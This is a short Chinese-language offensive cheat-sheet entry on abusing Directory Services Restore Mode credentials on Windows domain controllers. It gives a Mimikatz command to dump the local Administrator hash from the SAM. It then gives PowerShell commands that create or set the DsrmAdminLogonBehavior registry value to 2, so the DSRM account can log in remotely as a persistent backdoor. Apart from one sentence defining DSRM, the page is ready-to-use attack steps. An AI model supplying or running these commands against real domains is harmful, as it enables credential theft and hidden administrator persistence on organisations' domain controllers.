# 密码 - 目录服务还原模式凭据 (DSRM Credentials)

> 目录服务还原模式 (Directory Services Restore Mode, DSRM) 是 Windows Server 域控制器的安全模式启动选项。DSRM 允许管理员修复或恢复 Active Directory 数据库。

这是每个域控制器 (DC) 内部的本地管理员帐户。由于在此机器中具有管理员权限，你可以使用 Mimikatz 导出本地 Administrator 的哈希。然后，修改注册表以激活此密码，以便你可以远程访问此本地 Administrator 用户。

```ps1
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# 检查键是否存在并获取其值
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# 如果不存在，创建值为 "2" 的键
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# 将值更改为 "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```
